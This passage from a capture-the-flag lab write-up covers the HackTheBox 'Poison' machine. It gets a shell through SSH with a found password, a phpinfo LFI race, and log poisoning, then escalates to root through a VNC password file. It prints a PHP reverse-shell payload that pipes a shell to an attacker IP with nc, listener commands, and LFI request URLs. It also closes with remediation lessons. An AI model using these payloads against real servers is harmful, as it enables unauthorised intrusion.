<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span># $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
<span class="lineno" data-linenos="2 "></span>#
<span class="lineno" data-linenos="3 "></span>root:*:0:0:Charlie &amp;:/root:/bin/csh
<span class="lineno" data-linenos="4 "></span>toor:*:0:0:Bourne-again Superuser:/root:
<span class="lineno" data-linenos="5 "></span>.....
<span class="lineno" data-linenos="6 "></span>charix:*:1001:1001:charix:/home/charix:/bin/csh
</pre></div>

<p>Only two users have login shells: root and charix. Considering the password we found, we know it belongs to Charix.</p>
<p>SSH into Charix account using the credentials we found.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>ssh charix@10.10.10.84
</pre></div>

<p>View the user.txt flag.</p>
<p><img alt="" src="../../img/Poison Writeup wo Metasploit/1_6LIz4nn7HtwdJAb79pRtfw.png" /></p>
<p><strong>Method 2: phpinfo.php Race Condition</strong></p>
<p>In 2011, <a href="https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf">this research paper</a> was published outlining a race condition that can turn an LFI vulnerability to a remote code execution (RCE) vulnerability. The following server side components are required to satisfy this exploitable condition:</p>
<ul>
<li>
<p>An LFI vulnerability</p>
</li>
<li>
<p>Any script that displays the output of the PHPInfo() configuration</p>
</li>
</ul>
<p>As we saw in the enumeration phase, the Poison htb server satisfies both conditions. Therefore, let’s download the<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/phpinfolfi.py"> script</a> and modify it to fit our needs.</p>
<p>First, change the payload to include the following reverse shell available on kali by default.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>/usr/share/laudanum/php/php-reverse-shell.php
</pre></div>

<p>Make sure to edit the IP address and port. Next, change the LFIREQ parameter to the one in our application.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>LFIREQ=&quot;&quot;&quot;GET /browse.php?file=%s
</pre></div>

<p>You’ll also have to change all the “=&gt;” to “=&amp;gt” so that the script compiles properly.</p>
<p>That’s it for modifying the script. Now, set up a listener to receive the shell.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nc -nlvp 1234
</pre></div>

<p>Run the script.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>python phpinfolfi.py 10.10.10.84 80
</pre></div>

<p>We get a shell!</p>
<p><img alt="" src="../../img/Poison Writeup wo Metasploit/1_s_GIfAvOavOqE_ACMDSlNw.png" /></p>
<p><strong>Method 3: Log Poisoning</strong></p>
<p>This was probably the intended way of solving the machine considering that the box is called “Poison”. Log Poisoning is a common technique used to gain RCE from an LFI vulnerability. The way it works is that the attacker attempts to inject malicious input to the server log. Then using the LFI vulnerability, the attacker calls the server log thereby executing the injected malicious code.</p>
<p>So the first thing we need to do is find the log file being used on the server. A quick google search tells us that freebsd saves the log file in the following location.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>/var/log/httpd-access.log
</pre></div>

<p>A sample entry in the access log is:</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>10.10.14.12 - - [05/Jan/2020:06:20:15 +0100] &quot;GET /browse.php?file=php://filter/convert.base64-encode/resource=ini.php HTTP/1.1&quot; 200 44 &quot;[http://10.10.10.84/](http://10.10.10.84/)&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&quot;
</pre></div>

<p>Notice that the user agent “<em>Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</em>” is being logged. Since the user agent is something that is completely in our control, we can simply change it to send a reverse shell back to our machine.</p>
<p>Intercept the request in Burp and change the user agent to the reverse shell from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>&lt;?php exec(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.12 6666 &gt;/tmp/f&#39;) ?&gt;
</pre></div>

<p>Set up a listener to receive the reverse shell.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nc -nlvp 6666
</pre></div>

<p>Execute the request in Burp so that the PHP code is saved in the log file. Using the LFI vulnerability call the log file which in turn should execute the reverse shell.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>[http://10.10.10.84/browse.php?file=%2Fvar%2Flog%2Fhttpd-access.log](http://10.10.10.84/browse.php?file=%2Fvar%2Flog%2Fhttpd-access.log)
</pre></div>

<p>We get a shell!</p>
<p><img alt="" src="../../img/Poison Writeup wo Metasploit/1_ov6P4njioA4mjDaHBHat2Q.png" /></p>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Since the machine is running a freeBSD OS, the LinEnum script won’t work on it. So we’ll have to resort to manual means of enumeration.</p>
<p>If you list the files in Charix’s home directory, you’ll find a secret.zip file.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>charix@Poison:~ % ls -l
<span class="lineno" data-linenos="2 "></span>total 8
<span class="lineno" data-linenos="3 "></span>-rw-r-----  1 root  charix  166 Mar 19  2018 secret.zip
<span class="lineno" data-linenos="4 "></span>-rw-r-----  1 root  charix   33 Mar 19  2018 user.txt
</pre></div>

<p>If you try to decompress the file, it will ask for a password. Let’s first transfer the file to our attack machine.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>scp charix@10.10.10.84:/home/charix/secret.zip .
</pre></div>

<p>Try to decompress the file using Charix’s SSH password. Most user’s reuse passwords.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>unzip secret.zip
</pre></div>

<p>It works! Check the file type.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>root@kali:~/Desktop/htb/poison# file secret
<span class="lineno" data-linenos="2 "></span>secret: Non-ISO extended-ASCII text, with no line terminators
</pre></div>

<p>The file seems to be encoded. Before we go down the route of figuring out what type of encoding is being used, let’s park this for now and do more enumeration.</p>
<p>In the target machine, run the ps command to see which processes are running.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>ps -aux
</pre></div>

<p>There’s a VNC process being run as root.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>root    529  0.0  0.7  23620 7432 v0- I    Fri23      0:00.04 Xvnc :1 -desktop X -httpd /usr/local/sha
</pre></div>

<p>Let’s view the entire process information.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>charix@Poison:~ % ps -auxww | grep vnc
<span class="lineno" data-linenos="2 "></span>root    529   0.0  0.7  23620 7432 v0- I    Fri23      0:00.04 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
</pre></div>

<p>VNC is a remote access software. The -rfbport flag tells us that it’s listening on port 5901 on localhost.</p>
<p>We can verify that using the netstat command.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>charix@Poison:~ % netstat -an | grep LIST
<span class="lineno" data-linenos="2 "></span>tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
<span class="lineno" data-linenos="3 "></span>tcp4       0      0 *.80                   *.*                    LISTEN
<span class="lineno" data-linenos="4 "></span>tcp6       0      0 *.80                   *.*                    LISTEN
<span class="lineno" data-linenos="5 "></span>tcp4       0      0 *.22                   *.*                    LISTEN
<span class="lineno" data-linenos="6 "></span>tcp6       0      0 *.22                   *.*                    LISTEN
<span class="lineno" data-linenos="7 "></span>tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
<span class="lineno" data-linenos="8 "></span>tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
</pre></div>

<p>Since VNC is a graphical user interface software, we can’t access it through our target machine. We need port forwarding.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span># ssh -L [local-port]:[remote-ip]:[remote-port]
<span class="lineno" data-linenos="2 "></span>ssh -L 5000:127.0.0.1:5901 charix@10.10.10.84
</pre></div>

<p>The above command allocates a socket to listen to port 5000 on localhost from my attack machine (kali). Whenever a connection is made to port 5000, the connection is forwarded over a secure channel and is made to port 5901 on localhost on the target machine (poison).</p>
<p>We can verify that the command worked using netstat.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>root@kali:~/Desktop/htb/poison# netstat -an | grep LIST
<span class="lineno" data-linenos="2 "></span>tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN
<span class="lineno" data-linenos="3 "></span>tcp6       0      0 ::1:5000                :::*                    LISTEN
</pre></div>

<p>Now that port forwarding is set, let’s connect to VNC on the attack machine.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>root@kali:~/Desktop/htb/poison# vncviewer 127.0.0.1:5000
<span class="lineno" data-linenos="2 "></span>Connected to RFB server, using protocol version 3.8
<span class="lineno" data-linenos="3 "></span>Enabling TightVNC protocol extensions
<span class="lineno" data-linenos="4 "></span>Performing standard VNC authentication
<span class="lineno" data-linenos="5 "></span>Password:
</pre></div>

<p>I tried Charix’s password but that didn’t work. I then googled “vnc password” and found the following description on the man page.</p>
<p><img alt="" src="../../img/Poison Writeup wo Metasploit/1_jQwwoJMoBXfU1BhRGjjYCw.png" /></p>
<p>When setting a VNC password, the password is obfuscated and saved as a file on the server. Instead of directly entering the password, the obfuscated password file can be included using the passwd option. Earlier in this blog we found a secret file that we didn’t know where to use. So let’s see if it’s the obfuscated password file we’re looking for.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>vncviewer 127.0.0.1:5000 -passwd secret
</pre></div>

<p>We’re in!</p>
<p><img alt="" src="../../img/Poison Writeup wo Metasploit/1_k_1NH-bUsfMMvByRSWSPjQ.png" /></p>
<p>VNC was running with root privileges so we can view the root.txt file.</p>
<p><img alt="" src="../../img/Poison Writeup wo Metasploit/1_PI-IzUmDv4Hn17f5CWPhWw.png" /></p>
<p>Before we end this blog, let’s check if there is any online tools that decode the obfuscated password file. Since it’s not encrypted, we should be able to reverse it without a password.</p>
<p>After a bit of googling, I found this <a href="https://github.com/trinitronx/vncpasswd.py">github repository</a> that does that for us. Clone the repository and run the script on our file.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>python vncpasswd.py -d -f ../../htb/poison/secret
</pre></div>

<ul>
<li>
<p><strong>-d:</strong> decrypt</p>
</li>
<li>
<p><strong>-f:</strong> file</p>
</li>
</ul>
<p>We get the following output showing us the plaintext password is “VNCP@\$\$!”.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>Cannot read from Windows Registry on a Linux system
<span class="lineno" data-linenos="2 "></span>Cannot write to Windows Registry on a Linux system
<span class="lineno" data-linenos="3 "></span>Decrypted Bin Pass= &#39;VNCP@$$!&#39;
<span class="lineno" data-linenos="4 "></span>Decrypted Hex Pass= &#39;564e435040242421&#39;
</pre></div>

<p>Now that we know the password, we could directly log into VNC using the plaintext password instead of the obfuscated password file.</p>
<h1 id="lessons-learned">Lessons Learned</h1>
<p>To gain an initial foothold on the box we exploited four vulnerabilities.</p>
<ol>
<li>
<p>LFI vulnerability that allowed us to both enumerate files and call and execute malicious code we stored on the server. This could have been easily avoided if the developer validated user input.</p>
</li>
<li>
<p>Sensitive information disclosure. The pwdbackup.txt file that contained a user’s SSH password was publicly stored on the server for anyone to read. Since the content of the file was encoded instead of encrypted, we were able to easily reverse the content and get the plaintext password. This could have been avoided if the password file was not publicly stored on the server and strong encryption algorithms were used to encrypt the file.</p>
</li>
<li>
<p>Log file poisoning. Since the log file was storing the user agent (user controlled data) without any input validation, we were able to inject malicious code into the server that we executed using the LFI vulnerability. Again, this could have been easily avoided if the developer validated user input.</p>
</li>
<li>
<p>Security misconfiguration that lead to a race condition in phpinfo.php file. This required two conditions to be present: (1) an LFI vulnerability which we already discussed, and (2) a script that displays the output of the phpinfo() configuration. The administrators should have disabled the phpinfo() function in all production environments.</p>
</li>
</ol>
<p>To escalate privileges we exploited one vulnerability.</p>
<ol>
<li>Reuse of password. The zip file that contained the VNC password was encrypted using Charix’s SSH password. The question we really should be asking is why is the password that gives you access to the root account encrypted with a lower privileged user’s password? The remediation recommendations for this vulnerability are obvious.</li>
</ol>
<h1 id="conclusion">Conclusion</h1>
<p>21 machines down, 26 more to go!</p>
<p><img alt="" src="../../img/Poison Writeup wo Metasploit/1_nx-rDq5Gl8JlsGxv6evr2A.png" /></p>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../Apocalyst Writeup/" title="7. Apocalyst Writeup.md" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                7. Apocalyst Writeup.md
              </span>
            </div>
          </a>
        
        
          <a href="../Postman Writeup/" title="9. Postman Writeup.md" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                9. Postman Writeup.md
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Built by <a href="http://github.com/rushic24">Rushi</a> &copy; 2020
          </div>
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
  <div class="md-footer-social">
    <link rel="stylesheet" href="../../assets/fonts/font-awesome.css">
    
      <a href="https://github.com/rushic24" class="md-footer-social__link fa fa-"></a>
    
      <a href="https://www.linkedin.com/in/rushichaudhari" class="md-footer-social__link fa fa-"></a>
    
      <a href="" class="md-footer-social__link fa fa-"></a>
    
  </div>

    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
      
        <script src="../../js/katex.js"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"></script>
      
    
  </body>
</html>